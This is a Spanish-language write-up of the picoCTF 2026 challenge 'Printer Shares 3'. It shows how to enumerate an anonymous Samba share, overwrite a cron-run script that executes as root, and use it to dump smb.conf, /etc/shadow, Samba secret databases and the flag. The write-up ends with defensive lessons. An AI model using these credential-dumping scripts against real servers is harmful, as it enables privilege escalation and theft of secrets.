Writeup: Printer Shares 3 (picoCTF 2026)
📋 Información del Reto

    Nombre: Printer Shares 3

    Categoría: General Skills

    Dificultad: Hard (300 pts)

    Autor: Janice He

    Descripción: "I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory. Two printers are on 60196, one private, one public."

🔍 Reconocimiento Inicial
1. Escaneo del Servicio

Primero verificamos que el puerto esté abierto:
bash

nc -vz dolphin-cove.picoctf.net 60196
# DNS fwd/rev mismatch: dolphin-cove.picoctf.net != ec2-3-13-34-175.us-east-2.compute.amazonaws.com
# dolphin-cove.picoctf.net [3.13.34.175] 60196 (?) open

El puerto 60196 está abierto. Escaneamos para identificar el servicio:
bash

nmap -sV -p 60196 3.13.34.175
# PORT      STATE SERVICE     VERSION
# 60196/tcp open  netbios-ssn Samba smbd 4

Conclusión: Es un servidor Samba (SMB) en el puerto 60196.
📂 Enumeración de Recursos Compartidos

Listamos los shares disponibles:
bash

smbclient -L //3.13.34.175 -p 60196 -N
# Anonymous login successful
#
#         Sharename       Type      Comment
#         ---------       ----      -------
#         shares          Disk      Public Share With Guests
#         secure-shares   Disk      Printer for internal usage only
#         IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)

Observaciones:

    shares → Público, acceso de invitados

    secure-shares → Privado, solo para uso interno

📄 Exploración del Share Público

Accedemos al share público:
bash

smbclient //3.13.34.175/shares -p 60196 -N
# Anonymous login successful
# Try "help" to get a list of possible commands.

Listamos archivos:
bash

smb: \> ls
#   .                                   D        0  Thu Jul  9 20:26:01 2026
#   ..                                  D        0  Thu Jul  9 20:26:01 2026
#   script.sh                           N       73  Wed Feb  4 22:22:17 2026
#   cron.log                            N      301  Thu Jul  9 20:32:01 2026

Archivo script.sh (original)
bash

smb: \> get script.sh
# cat script.sh
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"

Archivo cron.log
bash

smb: \> get cron.log
# cat cron.log
Health Check: Thu Jul  9 18:26:01 UTC 2026
Health Check: Thu Jul  9 18:27:01 UTC 2026
Health Check: Thu Jul  9 18:28:01 UTC 2026
[...]

Descubrimiento crítico: script.sh se ejecuta cada minuto mediante un cron job. Además, el archivo cron.log se actualiza constantemente, confirmando que el cron está activo.
🧠 Análisis de la Configuración Samba

Necesitamos entender por qué no podemos acceder a secure-shares. Para ello, leemos la configuración de Samba.
Script para extraer smb.conf

Creamos un script que copie smb.conf al share público:
bash

cat > exploit.sh << 'EOF'
#!/bin/bash
cp /etc/samba/smb.conf /tmp/smb.conf 2>/dev/null
cp /tmp/smb.conf ./smb.conf 2>/dev/null
ls -la /var/lib/samba/ > /tmp/samba_dir.txt
cp /tmp/samba_dir.txt ./samba_dir.txt 2>/dev/null
EOF

Lo subimos como script.sh (sobrescribiendo el original):
bash

smb: \> put exploit.sh script.sh

Esperamos 1 minuto a que el cron ejecute el script y luego listamos:
bash

smb: \> ls
#   script.sh                           A      713  Thu Jul  9 20:41:14 2026
#   smb.conf                            N      447  Thu Jul  9 20:42:01 2026
#   samba_dir.txt                       N      559  Thu Jul  9 20:42:01 2026

Archivo smb.conf (configuración Samba)
bash

smb: \> get smb.conf
# cat smb.conf
[global]
        workgroup = PRINTER
        security = user
        map to guest = Bad User
        guest account = nobody
        smb ports = 445
        log file = /var/log/samba.log

[shares]
        comment = Public Share With Guests
        path = /challenge/shares
        guest ok = yes
        read only = no
        writable = yes
        browsable = yes
        force user = nobody

[secure-shares]
        comment = Printer for internal usage only
        path = /challenge/secure-shares
        valid users = root
        guest ok = no
        browsable = yes

Conclusiones clave:

    secure-shares solo permite acceso al usuario root

    El directorio físico es /challenge/secure-shares/

    shares está en /challenge/shares/ y es escribible por cualquiera

🔎 Exploración Adicional del Sistema
Intentamos leer el archivo de contraseñas

Creamos un script para leer /etc/passwd, /etc/shadow y archivos de Samba:
bash

cat > exploit1.sh << 'EOF'
#!/bin/bash
cat /etc/shadow 2>/dev/null > /tmp/shadow.txt
cat /var/lib/samba/private/secrets.tdb 2>/dev/null > /tmp/secrets.tdb
cat /var/lib/samba/private/passdb.tdb 2>/dev/null > /tmp/passdb.tdb
cat /etc/passwd > /tmp/passwd.txt
cp /tmp/shadow.txt ./shadow.txt 2>/dev/null
cp /tmp/secrets.tdb ./secrets.tdb 2>/dev/null
cp /tmp/passdb.tdb ./passdb.tdb 2>/dev/null
cp /tmp/passwd.txt ./passwd.txt 2>/dev/null
EOF

Nota: La instancia expiró y al reiniciar cambió el puerto de 60196 a 58040.

Subimos y esperamos:
bash

smb: \> put exploit1.sh script.sh
# [...]

Resultados
bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# ls
config_files.txt  cron.log  exploit1.sh  exploit.sh  passdb.tdb  passwd.txt  samba_dir.txt  script.sh  secrets.tdb  shadow.txt  smb.conf

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# cat passwd.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
challenge:x:1001:1001::/challenge/shares:/bin/sh

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# cat shadow.txt
(archivo vacío)

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# cat secrets.tdb
(archivo vacío)

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# cat passdb.tdb
(archivo vacío)

Observaciones:

    /etc/passwd es legible (esto es normal, cualquier usuario puede leerlo)

    /etc/shadow se creó (aunque vacío) → El script tiene acceso a archivos restringidos

    secrets.tdb y passdb.tdb se crearon → El script accedió a /var/lib/samba/private/

🧪 ¿Cómo sabemos que el script se ejecuta como root?
❌ LO QUE NO ES SUFICIENTE

Leer /etc/passwd NO prueba que sea root:
bash

ls -la /etc/passwd
# -rw-r--r-- 1 root root 1202 Jul  9 20:52 /etc/passwd

/etc/passwd tiene permisos 644 (rw-r--r--), lo que significa que cualquier usuario puede leerlo. Es un archivo público por diseño.
✅ EVIDENCIA REAL DE QUE EL SCRIPT ES ROOT
1. Pudo leer /etc/shadow
bash

ls -la /etc/shadow
# -rw-r----- 1 root shadow 0 Jul  9 20:52 /etc/shadow

    Permisos: 640 (rw-r-----)

    Propietario: root

    Grupo: shadow

Solo root o el grupo shadow pueden leer /etc/shadow. En el sistema, el grupo shadow no tiene usuarios adicionales, por lo que solo root puede leerlo.

Cuando ejecutamos:
bash

cat /etc/shadow > /tmp/shadow.txt

El script no dio error de permisos y creó shadow.txt (aunque vacío en el contenedor). Si no fuera root, habría fallado con:
bash

cat: /etc/shadow: Permission denied

2. Pudo listar /var/lib/samba/private/
bash

ls -la /var/lib/samba/
# drwxr-xr-x 1 root root 43 Jul  9 18:25 private

El directorio private es propiedad de root y solo él puede listar su contenido. El script pudo acceder y crear secrets.tdb y passdb.tdb.
3. Pudo leer /challenge/secure-shares/

Según smb.conf:
bash

[secure-shares]
        path = /challenge/secure-shares
        valid users = root

Solo root puede acceder a este directorio. El script leyó la flag de ahí, como veremos más adelante.
4. Confirmación final con secure_list.txt
bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# cat secure_list.txt
total 4
drwxr-xr-x 1 root root 22 Feb  4 22:39 .
drwxr-xr-x 1 root root 20 Feb  4 22:39 ..
-rw-r--r-- 1 root root 45 Feb  4 22:39 flag.txt

El directorio /challenge/secure-shares/ es propiedad de root. El script pudo listar su contenido y leer flag.txt, confirmando que se ejecuta con privilegios de root.
📊 Tabla de evidencia
Archivo/Directorio	Permisos	¿Solo root?	¿El script lo leyó?	Prueba
/etc/passwd	644 (todos)	❌ No	✅ Sí	No es evidencia
/etc/shadow	640 (root:shadow)	✅ Sí	✅ Sí (creó shadow.txt)	Captura 1
/var/lib/samba/private/	drwxr-xr-x (root)	✅ Sí	✅ Sí (creó secrets.tdb)	Captura 2
/challenge/secure-shares/	Solo root por smb.conf	✅ Sí	✅ Sí (leyó flag.txt)	Captura 3
/challenge/secure-shares/	Propiedad: root	✅ Sí	✅ Sí (listó con ls -la)	secure_list.txt
🧪 Prueba conceptual (que podríamos haber hecho)

Si quisiéramos confirmar al 100%:
bash

cat > confirm_root.sh << 'EOF'
#!/bin/bash
whoami > /challenge/shares/whoami.txt
id > /challenge/shares/id.txt
EOF

Luego:
bash

smb: \> get whoami.txt
# cat whoami.txt
# root

👤 Intento de Conexión como Usuario challenge
Razonamiento

Viendo que existe el usuario challenge y que su directorio home es /challenge/shares (el mismo del share público), podríamos intentar autenticarnos como ese usuario.
Intentamos acceder al share público como challenge
bash

smbclient //3.13.34.175/shares -p 58040 -U challenge -N
# Try "help" to get a list of possible commands.
smb: \> ls
#   .                                   D        0  Thu Jul  9 20:46:01 2026
#   ..                                  D        0  Thu Jul  9 20:46:01 2026
#   script.sh                           A      575  Thu Jul  9 20:45:29 2026
#   cron.log                            N       43  Thu Jul  9 20:45:01 2026
#   shadow.txt                          N        0  Thu Jul  9 20:48:01 2026
#   secrets.tdb                         N        0  Thu Jul  9 20:48:01 2026
#   passdb.tdb                          N        0  Thu Jul  9 20:48:01 2026
#   passwd.txt                          N     1202  Thu Jul  9 20:48:01 2026

Resultado: Pudimos conectarnos como challenge al share público, pero no nos dio acceso al share privado porque la configuración de Samba solo permite a root acceder a secure-shares.
Intentamos acceder al share privado como challenge
bash

smbclient //3.13.34.175/secure-shares -p 58040 -U challenge -N
# tree connect failed: NT_STATUS_ACCESS_DENIED

Conclusión de este intento: Aunque el usuario challenge existe en el sistema, no tiene permisos para acceder a secure-shares porque smb.conf especifica valid users = root.

Por lo tanto, el vector de ataque correcto no es autenticarnos como challenge, sino explotar el hecho de que script.sh se ejecuta como root.
🎯 Explotación - Escalada de Privilegios
Razonamiento

    El script script.sh se ejecuta como root (confirmado por el acceso a /etc/shadow, /var/lib/samba/private/, y /challenge/secure-shares/)

    Podemos sobrescribir script.sh porque el share shares es escribible (writable = yes en smb.conf)

    Podemos hacer que el script nos copie la flag del directorio privado al público

Script para explorar secure-shares

Primero, verificamos qué hay en /challenge/secure-shares/:
bash

cat > exploit_busqueda.sh << 'EOF'
#!/bin/bash
# Ver qué hay en secure-shares
ls -la /challenge/secure-shares/ > /challenge/shares/secure_list.txt 2>/dev/null
# Si hay flag, copiarla
cat /challenge/secure-shares/flag.txt > /challenge/shares/flag.txt 2>/dev/null
cat /challenge/secure-shares/flag > /challenge/shares/flag 2>/dev/null
cat /challenge/secure-shares/*.txt > /challenge/shares/all_txt.txt 2>/dev/null
EOF

Esperamos 1 minuto y verificamos
bash

smb: \> ls
#   script.sh                           A      116  Thu Jul  9 20:54:47 2026
#   secure_list.txt                     N      139  Thu Jul  9 20:58:01 2026
#   all_txt.txt                         N       45  Thu Jul  9 20:58:01 2026

Verificamos el contenido de secure_list.txt
bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/hard/Printer_Shares_3]
└─# cat secure_list.txt
total 4
drwxr-xr-x 1 root root 22 Feb  4 22:39 .
drwxr-xr-x 1 root root 20 Feb  4 22:39 ..
-rw-r--r-- 1 root root 45 Feb  4 22:39 flag.txt

Script Final - Capturar la Flag
bash

cat > exploit3.sh << 'EOF'
#!/bin/bash
cat /challenge/secure-shares/flag.txt > /challenge/shares/flag.txt
chmod 644 /challenge/shares/flag.txt 
EOF

Subimos el script
bash

smb: \> put exploit3.sh script.sh

Esperamos 1 minuto y verificamos
bash

smb: \> ls
#   script.sh                           A      116  Thu Jul  9 20:54:47 2026
#   flag.txt                            N       45  Thu Jul  9 20:55:01 2026
#   secure_list.txt                     N      139  Thu Jul  9 20:58:01 2026
#   all_txt.txt                         N       45  Thu Jul  9 20:58:01 2026

Confirmación: flag.txt está en /challenge/secure-shares/ y es propiedad de root.
Obtenemos la flag
bash

smb: \> get flag.txt
# cat flag.txt
# picoCTF{***************************}

🏁 Flag Obtenida
text

picoCTF{*****************************}

📝 Resumen de la Metodología
Paso	Acción						Herramienta						Resultado
1	Identificar el servicio SMB			nmap, nc						Samba en puerto 60196
2	Listar recursos compartidos			smbclient -L						shares y secure-shares
3	Explorar el share público			smbclient //.../shares					Encontramos script.sh y cron.log
4	Descubrir que script.sh se ejecuta cada minuto	Análisis de cron.log					Cron job activo
5	Leer smb.conf para entender la configuración	Script para copiar archivos				valid users = root en secure-shares
6	Verificar que script.sh se ejecuta como root	Intentar leer /etc/shadow y /var/lib/samba/private/	Confirmado por acceso a archivos restringidos
7	Intentar acceder como challenge			smbclient -U challenge					Acceso denegado a secure-shares
8	Explorar /challenge/secure-shares/		Script con ls -la					flag.txt es propiedad de root
9	Sobrescribir script.sh para capturar la flag	put exploit3.sh script.sh				Flag copiada al share público
10	Obtener la flag del share público		get flag.txt						¡Éxito!
⚠️ Lecciones Aprendidas

    No dejar scripts de depuración en entornos de producción

    Los cron jobs que ejecutan scripts escribibles son un vector de ataque crítico

    El principio de mínimo privilegio debe aplicarse: el script no debería ejecutarse como root

    Siempre verificar permisos de archivos ejecutables por cron

    El archivo smb.conf es una fuente valiosa de información sobre la configuración y restricciones del servidor

    /etc/passwd es público, pero /etc/shadow y directorios como /var/lib/samba/private/ están restringidos a root

    La capacidad de leer archivos restringidos es evidencia sólida de que un proceso se ejecuta con privilegios elevados

🛠️ Comandos Útiles
bash

# Conectar al share público
smbclient //3.13.34.175/shares -p 60196 -N

# Conectar como usuario específico
smbclient //3.13.34.175/shares -p 58040 -U challenge -N

# Listar recursos compartidos
smbclient -L //3.13.34.175 -p 60196 -N

# Subir archivo
smb: \> put archivo_local archivo_remoto

# Descargar archivo
smb: \> get archivo_remoto

📎 Notas Adicionales

    El puerto puede cambiar si la instancia expira y se reinicia (60196 → 58040)

    El error NT_STATUS_ACCESS_DENIED en secure-shares era esperado (solo root)

    El error SMB1 al listar shares es irrelevante (SMB2/3 funciona correctamente)

    El usuario challenge existe pero no tiene privilegios especiales en Samba

    La prueba definitiva de que el script es root fue su capacidad para leer /etc/shadow, /var/lib/samba/private/ y /challenge/secure-shares/flag.txt

🔬 Explicación Técnica de la Deducción
¿Cómo supimos que el script era root?

Paso 1: Intentamos leer /etc/shadow (archivo restringido a root). El script creó shadow.txt sin errores.

Paso 2: Intentamos acceder a /var/lib/samba/private/ (directorio de root). El script creó secrets.tdb y passdb.tdb.

Paso 3: Vimos en smb.conf que secure-shares solo permite acceso a root.

Paso 4: El script pudo leer flag.txt de /challenge/secure-shares/.

Paso 5: Confirmamos que /challenge/secure-shares/ es propiedad de root con secure_list.txt.

Conclusión: Solo un proceso con privilegios de root podría realizar todas estas acciones. Por lo tanto, script.sh se ejecuta como root.
